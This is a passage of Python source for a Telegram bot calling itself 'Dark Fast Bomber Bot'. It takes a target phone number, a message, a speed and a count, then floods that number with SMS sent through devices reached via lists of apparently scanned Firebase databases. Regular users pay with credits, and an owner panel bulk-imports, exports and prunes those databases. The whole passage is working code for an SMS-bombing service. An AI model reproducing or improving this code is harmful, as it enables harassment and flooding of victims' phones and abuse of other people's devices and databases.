        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS</b>\n\n{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')}</b>\n\nNumber daalo:",
        reply_markup=kb([(sc('cancel'), "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_number, F.text)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Protected number!</b>", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"✅ <code>{mask_number(number)}</code>\n\n{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')}</b>\n\nMessage:",
        reply_markup=kb([(sc('cancel'), "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_number)
async def admin_got_number_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo.", parse_mode="HTML")

@R.message(S.admin_send_message, F.text)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(f"✅ Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')}</b>",
        reply_markup=speed_kb("admin"), parse_mode="HTML")

@R.message(S.admin_send_message)
async def admin_got_message_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)
    count = len(get_cached_devices())
    await cq.message.edit_text(f"{speed_label}!\n\n{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')}</b>\n\nAPIs: <b>{count}</b>\n\nKitne?",
        reply_markup=kb([(sc('cancel'), "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_count, F.text)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(sc('admin panel'), "admin:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.message(S.admin_send_count)
async def admin_got_count_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo.", parse_mode="HTML")

# ================= SMS BLAST CORE =================
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending chal rahi hai!</b>", parse_mode="HTML"); return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"Progress msg fail: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0: break
                async with session.lock:
                    if session.cancelled: break
                fb_id = device["fb_id"]; fb_url = device["fb_url"]; dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0
                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled: break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1; device_sent += 1; msgs_left -= 1
                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number, "message": message[:100],
                                    "timestamp": int(time.time()), "status": "sent"})
                                save(d_temp)
                        else:
                            sent_fail += 1; msgs_left -= 1
                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or (sent_ok + sent_fail) == count or session.cancelled):
                            current_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML")
                            except TelegramBadRequest: pass
                            last_update_time = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"Send loop error for {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS: del USER_SESSIONS[uid]

    d_final = load()
    if not is_regular_user:
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number, "message": message[:100],
            "timestamp": int(time.time()), "status": "completed" if not was_cancelled else "stopped"})
    else:
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
    save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid, f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        u_chat = await bot.get_chat(uid)
        u_name = u_chat.full_name or "Unknown"
        u_uname = f"@{u_chat.username}" if u_chat.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    asyncio.create_task(send_channel_log(bot,
        f"🚀 <b>SMS BLAST</b>\n\n👤 {u_name}\n🆔 <code>{uid}</code>\n🌐 {u_uname}\n"
        f"📞 <code>{number}</code>\n💬 <code>{message}</code>\n"
        f"✅ Sent: <b>{sent_ok}</b>\n❌ Failed: <b>{sent_fail}</b>\n"
        f"📊 Count: <b>{count}</b>\n⏱ <b>{fmt_duration(duration)}</b>\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"))

    if sent_fail == 0 and sent_ok > 0: icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0: icon = em(EMOJI_WARNING, "⚠️")
    else: icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Left: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>Stopped!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()): back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()): back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else: back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML")
    except Exception as e:
        log.error(f"Final msg edit fail: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Koi active sending nahi!", show_alert=True); return
        session.cancelled = True
    await cq.answer("🛑 Stop signal!", show_alert=True)
    try:
        async with session.lock:
            cs = session.sent; cf = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n✅ Sent: <b>{cs}</b>\n❌ Failed: <b>{cf}</b>",
            parse_mode="HTML")
    except: pass

# ================= FIREBASE MANAGER =================
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0

    total_fbs = len(d.get("firebases", []))
    online_fbs = sum(1 for fb in d.get("firebases", [])
                     if FB_DEVICE_COUNTS.get(fb["id"], {}).get("online", 0) > 0)
    offline_fbs = total_fbs - online_fbs
    auto_status = "🟢 ON" if AUTO_CLEANUP_ENABLED else "🔴 OFF"

    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"📊 ᴛᴏᴛᴀʟ   : <b>{total_fbs}</b>\n"
        f"🟢 ᴏɴʟɪɴᴇ  : <b>{online_fbs}</b>\n"
        f"🔴 ᴏғғʟɪɴᴇ : <b>{offline_fbs}</b>\n"
        f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴ : <b>{auto_status}</b>\n"
        f"<i>(3 consecutive fails → auto delete)</i>",
        reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
        f"Format: <code>Label | https://xxx.firebaseio.com</code>\nYa sirf URL bhejo.",
        reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase, F.text)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not is_valid_firebase_url(url):
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid Firebase URL!\n\n"
            f"Sirf HTTPS + <code>.firebaseio.com</code> ya <code>firebasedatabase.app</code>",
            parse_mode="HTML"); return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
    fb_id = f"{int(time.time())}_{uuid.uuid4().hex[:6]}"
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n🏷 {label}\n🔗 <code>{url}</code>",
        reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add via TXT</b>\n\n"
        f"<code>.txt</code> file bhejo. Har line:\n"
        f"<code>https://xxx.firebaseio.com</code>\n"
        f"ya <code>Label | https://xxx.firebaseio.com</code>",
        reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt", parse_mode="HTML"); return
    file_info = await msg.bot.get_file(doc.file_id)
    downloaded = await msg.bot.download_file(file_info.file_path)
    content = downloaded.read().decode('utf-8', errors='ignore')
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0; skipped = 0
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip(); url = parts[1].strip()
        else:
            url = line; label = url.replace("https://", "").split(".")[0][:20]
        if not is_valid_firebase_url(url):
            skipped += 1; continue
        url = url.rstrip("/")
        if url in existing:
            skipped += 1; continue
        existing.add(url)
        fb_id = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:6]}"
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs
    await safe_save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Added!</b>\n\n🔥 Added: <b>{added}</b>\n⚠️ Skipped: <b>{skipped}</b>\n📊 Total: <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt document bhejo.", parse_mode="HTML")

# ========== ✅ DELETE ALL FIREBASES ==========
@R.callback_query(F.data == "owner:fb:delete_all")
async def owner_fb_delete_all_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer("❌ Koi firebase nahi hai!", show_alert=True); return

    await cq.message.edit_text(
        f"{em(EMOJI_WARNING, '⚠️')} <b>DELETE ALL FIREBASES?</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Total DBs: <b>{len(fbs)}</b>\n\n"
        f"<i>Ye saare firebases permanently delete kar dega!\n"
        f"Ye action undo nahi ho sakta.</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <b>Recommendation:</b> Pehle 📥 Export karo backup ke liye.\n\n"
        f"<b>Confirm karo:</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("✅ ʏᴇs, ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:fb:delete_all_do", EMOJI_CHECK, "✅")],
            [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌")]
        ]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:delete_all_do")
async def owner_fb_delete_all_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return

    count = len(d.get("firebases", []))
    if count == 0:
        await cq.answer("✅ Already empty!", show_alert=True)
        await owner_fb_menu(cq, state); return

    d["firebases"] = []
    await safe_save(d)

    global CACHED_DEVICES, FB_DEVICE_COUNTS, FB_FAIL_COUNT
    CACHED_DEVICES = []
    FB_DEVICE_COUNTS.clear()
    FB_FAIL_COUNT.clear()

    log_activity(d, "fb_delete_all", uid, f"Deleted all {count} firebases")
    save(d)

    await cq.answer(f"🗑 All {count} firebases deleted!", show_alert=True)

    try:
        await cq.bot.send_message(MAIN_OWNER,
            f"{em(EMOJI_TRASH, '🗑')} <b>All Firebases Deleted</b>\n\n"
            f"{em(EMOJI_FIRE, '🔥')} Count: <b>{count}</b>\n"
            f"{em(EMOJI_STAR, '👤')} By: <code>{uid}</code>", parse_mode="HTML")
    except: pass

    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"✅ <b>All DBs Deleted!</b>\n\n"
        f"📊 Total: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d, 0), parse_mode="HTML")

# ========== EXPORT ONLINE ==========
@R.callback_query(F.data == "owner:fb:export_online")
async def owner_fb_export_online(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Sirf Super Admin ye export kar sakta hai!", show_alert=True); return
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer("❌ Koi firebase add nahi kiya!", show_alert=True); return

    devices = get_cached_devices()
    online_map = {}
    for dv in devices:
        online_map[dv["fb_id"]] = online_map.get(dv["fb_id"], 0) + 1

    online_fbs = []
    offline_fbs = []
    for fb in fbs:
        cnt = online_map.get(fb["id"], 0)
        if cnt > 0: online_fbs.append((fb, cnt))
        else: offline_fbs.append(fb)

    if not online_fbs:
        await cq.answer(f"❌ Koi online firebase nahi mila!\n({len(fbs)} total DBs, sab offline hain)", show_alert=True); return

    await cq.answer("📥 Generating TXT...")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "=" * 60,
        "#  ONLINE FIREBASE REPORT",
        "#  Generated by: Dark Fast Bomber Bot",
        f"#  Owner: {OWNER_NAME} ({uid})",
        f"#  Date: {timestamp}",
        "=" * 60, "",
        f"# Total Scanned DBs   : {len(fbs)}",
        f"# Online DBs          : {len(online_fbs)}",
        f"# Offline DBs         : {len(offline_fbs)}",
        f"# Total Online Devices: {len(devices)}",
        "", "=" * 60,
        "#  ONLINE FIREBASES (Label | URL | Devices)",
        "=" * 60, ""]
    for fb, cnt in sorted(online_fbs, key=lambda x: -x[1]):
        label = fb.get("label", fb["url"][:30])
        lines.append(f"{label} | {fb['url']} | devices: {cnt}")
    lines.append("")
    lines.append("=" * 60)
    lines.append("#  BOT IMPORT FORMAT (copy-paste in TXT bulk add)")
    lines.append("=" * 60)
    lines.append("")
    for fb, cnt in sorted(online_fbs, key=lambda x: -x[1]):
        label = fb.get("label", fb["url"][:30])
        lines.append(f"{label} | {fb['url']}")
    lines.append("")
    lines.append("=" * 60)
    if offline_fbs:
        lines.append(f"#  OFFLINE FIREBASES ({len(offline_fbs)} - commented out)")
        lines.append("=" * 60)
        for fb in offline_fbs:
            label = fb.get("label", fb["url"][:30])
            lines.append(f"#  {label} | {fb['url']}")
    lines.append("=" * 60)

    content = "\n".join(lines)
    filename = f"online_firebases_{int(time.time())}.txt"
    filepath = os.path.join(os.getcwd(), filename)
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
    except Exception as e:
        await cq.answer(f"❌ File write fail: {str(e)[:40]}", show_alert=True); return

    caption = (
        f"{em(EMOJI_CHECK, '📥')} <b>Online Firebase Export</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online DBs    : <b>{len(online_fbs)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Offline DBs   : <b>{len(offline_fbs)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} Online Devices: <b>{len(devices)}</b>\n\n"
        f"<i>Sirf Super Admin ye download kar sakta hai.</i>")
    try:
        await cq.message.reply_document(document=FSInputFile(filepath), caption=caption, parse_mode="HTML")
        log_activity(d, "fb_export_online", uid, f"Exported {len(online_fbs)} online DBs")
        save(d)
    except Exception as e:
        await cq.answer(f"❌ Send fail: {str(e)[:40]}", show_alert=True)
    finally:
        try:
            if os.path.exists(filepath): os.remove(filepath)
        except: pass

# ========== MANUAL CLEAN ==========
@R.callback_query(F.data == "owner:fb:clean_now")
async def owner_fb_clean_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer("❌ Koi firebase nahi!", show_alert=True); return
    devices = get_cached_devices()
    online_ids = {dv["fb_id"] for dv in devices}
    to_delete = [fb for fb in fbs if fb["id"] not in online_ids]
    if not to_delete:
        await cq.answer(f"✅ Sab {len(fbs)} DBs online hain!\nKuch delete nahi hoga.", show_alert=True); return

    preview_lines = []
    for fb in to_delete[:10]:
        preview_lines.append(f"  • <code>{fb.get('label', fb['url'][:20])}</code>")
    preview = "\n".join(preview_lines)
    if len(to_delete) > 10:
        preview += f"\n  <i>+{len(to_delete)-10} more</i>"

    await cq.message.edit_text(
        f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Delete {len(to_delete)} Offline DBs?</b>\n\n"
        f"<i>Ye DBs abhi online nahi hain (0 devices):</i>\n\n{preview}\n\n"
        f"{em(EMOJI_CHECK, '🟢')} Online rahenge: <b>{len(fbs) - len(to_delete)}</b>\n"
        f"{em(EMOJI_TRASH, '🗑')} Delete honge: <b>{len(to_delete)}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("✅ ʏᴇs, ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:fb:clean_do", EMOJI_CHECK, "✅")],
            [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌")]
        ]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:clean_do")
async def owner_fb_clean_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
    fbs = d.get("firebases", [])
    devices = get_cached_devices()
    online_ids = {dv["fb_id"] for dv in devices}
    to_delete = [fb for fb in fbs if fb["id"] not in online_ids]
    if not to_delete:
        await cq.answer("✅ Already clean!", show_alert=True)
        await owner_fb_menu(cq, state); return
    d["firebases"] = [fb for fb in fbs if fb["id"] in online_ids]
    global CACHED_DEVICES, FB_DEVICE_COUNTS, FB_FAIL_COUNT
    removed_ids = {fb["id"] for fb in to_delete}
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") not in removed_ids]
    for rid in removed_ids:
        FB_DEVICE_COUNTS.pop(rid, None)
        FB_FAIL_COUNT.pop(rid, None)
    await safe_save(d)
    log_activity(d, "fb_clean_manual", uid, f"Removed {len(to_delete)} offline DBs")
    save(d)
    await cq.answer(f"🗑 {len(to_delete)} DBs deleted!", show_alert=True)
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"✅ Cleanup complete!\n🗑 Removed: <b>{len(to_delete)}</b>\n📊 Total: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d, 0), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    await safe_save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS, FB_FAIL_COUNT
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    FB_FAIL_COUNT.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

# ================= HOME =================
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        await cq.answer("✅")
    except TelegramBadRequest:
        try:
            await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
            await cq.answer("✅")
        except: await cq.answer("⚠️ Try again")

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True); return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        await cq.answer("✅")
    except TelegramBadRequest:
        try:
            await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
            await cq.answer("✅")
        except: await cq.answer("⚠️ Try again")

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML"); return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ================= STATS =================
@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("📊")
    devices = get_cached_devices()
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device nahi")
    else:
        for dv in devices[:15]:
            dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
        if len(devices) > 15: dev_lines.append(f"\n<i>+{len(devices)-15} more</i>")
